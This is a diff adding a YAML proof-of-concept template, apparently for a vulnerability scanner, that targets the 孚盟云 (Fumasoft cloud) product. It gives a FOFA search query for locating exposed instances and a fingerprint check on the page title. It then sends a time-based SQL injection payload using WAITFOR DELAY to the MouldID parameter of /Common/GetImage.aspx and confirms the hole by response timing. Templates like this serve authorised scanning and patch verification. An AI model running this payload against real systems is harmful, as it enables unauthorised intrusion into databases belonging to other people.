@@ -1,0 +1,20 @@
+id: poc-yaml-fumasoft-getimage-ashx-sqli
+info:
+  name: 孚盟云 GetImage.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 孚盟云
+  fofa: app="孚盟软件-孚盟云"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(title,"孚盟云")
+- method: GET
+  path: /Common/GetImage.aspx?MouldID=-1';WAITFOR+DELAY'0:0:{{.t1}}'--
+  expression: status_code == 200 && contains(body,"__VIEWSTATE") && duration > t1
+    && duration < t2
+transport: http
